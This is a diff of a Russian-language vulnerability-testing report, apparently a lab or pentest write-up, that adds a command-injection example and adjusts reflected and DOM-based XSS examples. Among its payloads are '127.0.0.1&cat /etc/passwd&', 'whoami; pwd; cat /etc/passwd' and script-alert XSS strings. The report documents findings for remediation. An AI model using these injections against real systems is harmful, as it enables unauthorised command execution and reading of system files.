@@ -181,7 +181,7 @@
 ![png](image-28.png)
 
 **Cross Site Scripting (Reflected)**
-На сайте в форме поиска введем в строку поиска код -
+На сайте в форме поиска введем в строку поиска код :
 ```
 <a href="http://92.51.39.106:8050/" onclick="alert('Cross Site Scripting (Reflected) attack!'); return false;">Ссылка на x-сайт </a>
 ```
@@ -240,10 +240,18 @@ whoami; pwd; cat /etc/passwd
 
 ![png](image-18.png)
 
+ **Command Execution** 
+
+ По адресу http://92.51.39.106:7788/server.html ввести:
+
+ ``` 127.0.0.1&cat /etc/passwd&
+```
+
+![png](image-34.png)
+
 **Cross Site Scripting (DOM Based)**
 
-По адресу http://92.51.39.106:7788/index.html введем в поле поиска -
-
+По адресу http://92.51.39.106:7788/index.html введем в поле поиска :
 
 ```
 <script>alert('simple attack')</script>
@@ -253,7 +261,7 @@ whoami; pwd; cat /etc/passwd
 ![png](image-39.png)
 
 **Cross Site Scripting (Reflected)**
-На сайте в форме поиска введем в строку поиска код -
+На сайте в форме поиска введем в строку поиска код :
 ```
 <a href="http://92.51.39.106:8050/" onclick="alert('Cross Site Scripting (Reflected) attack!'); return false;">Ссылка на x-сайт </a>
 ```
@@ -271,6 +279,8 @@ whoami; pwd; cat /etc/passwd
 
 ```
 ![png](image-43.png)
+
+
 
 
 ### Рекомендации по исправлению уязвимостей.
